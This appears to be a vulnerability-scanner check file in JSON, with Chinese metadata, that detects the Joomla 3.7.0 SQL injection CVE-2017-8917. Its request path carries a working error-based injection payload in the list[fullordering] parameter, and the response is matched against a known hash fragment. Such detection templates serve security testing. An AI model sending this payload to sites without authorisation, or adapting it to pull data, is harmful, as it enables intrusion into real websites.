{
    "target":"joomla",
    "meta":{
        "name":    "Joomla 3.7.0 SQL注入漏洞",
        "remarks": "Joomla 3.7.0 存在SQL注入漏洞",
        "level":   1,
        "type":    "SQL注入",
        "author":   "wolf",
        "references": {
            "url":"https://paper.seebug.org/305/",
            "cve":"CVE-2017-8917",
            "kpid":"KP-0061"
        }
    },
    "request":{
        "path":     "/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x23,concat(1,md5(700)),1)",
        "postData": ""
    },
    "verify":{
        "type":  "string",
        "match": "e5841df2166dd424"
    }
}
